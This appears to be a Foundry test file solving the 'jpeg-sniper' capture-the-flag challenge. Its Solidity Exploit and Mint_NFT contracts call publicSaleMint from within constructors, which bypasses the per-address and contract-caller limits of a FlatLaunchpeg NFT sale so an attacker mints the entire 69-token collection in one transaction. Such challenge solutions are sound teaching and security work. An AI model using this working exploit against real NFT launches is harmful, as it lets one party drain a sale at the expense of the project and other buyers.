// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// utilities
import {Test} from "forge-std/Test.sol";
import {console} from "forge-std/console.sol";
// core contracts
import {FlatLaunchpeg} from "src/jpeg-sniper/FlatLaunchpeg.sol";


contract Testing is Test {

    address attacker = makeAddr('attacker');
    address o1 = makeAddr('o1');
    address o2 = makeAddr('o2');
    address admin = makeAddr('admin'); // should not be used
    address adminUser = makeAddr('adminUser'); // should not be used

    FlatLaunchpeg flatLaunchpeg;

    /// preliminary state
    function setUp() public {

        // funding accounts
        vm.deal(admin, 10_000 ether);
        vm.deal(attacker, 10_000 ether);
        vm.deal(adminUser, 10_000 ether);

        // deploying core contracts
        vm.prank(admin);
        flatLaunchpeg = new FlatLaunchpeg(69,5,5);

    }

    /// solves the challenge
    function testChallengeExploit() public {
        vm.startPrank(attacker,attacker);

        // implement solution here
        Exploit _exploit = new Exploit(address(flatLaunchpeg));
        console.log("balance attacker: ",flatLaunchpeg.balanceOf(attacker));
        
        vm.stopPrank();
        validation();
    }

    /// expected final state
    function validation() public {

        // attacker mints out collection in one tx
        assertEq(flatLaunchpeg.totalSupply(),69);
        assertEq(flatLaunchpeg.balanceOf(attacker),69);

    }

}

contract Exploit {

    FlatLaunchpeg flatLaunchpeg; //target
    
    constructor(address _flatLaunchpeg) payable {
        uint index; // will be used for the tokenId
        for(uint i=0;i<13;i++){ // Loop 13 -> we will mint NFT from 0 to 64
            Mint_NFT _mint_nft = new Mint_NFT(msg.sender,_flatLaunchpeg,5,index);
            index+=5;
        }
        //we have minted all the NFTs from tokenId 0 to 64
        //Now we only need to mint tokenId 65 to 68
        Mint_NFT _mint_nft = new Mint_NFT(msg.sender,_flatLaunchpeg,4,65);
    }
   
}
contract Mint_NFT {

    FlatLaunchpeg flatLaunchpeg ; //target
    constructor(address _owner, address _flatLaunchpeg ,uint _amount, uint index){
        flatLaunchpeg = FlatLaunchpeg(_flatLaunchpeg);
        flatLaunchpeg.publicSaleMint(_amount); //Mint _amount NFT
        
        //Send the NFTs minted to attacker address
        for(uint i=index;i<index+ _amount;i++){
            flatLaunchpeg.transferFrom(address(this),_owner,i);
        }
    }
}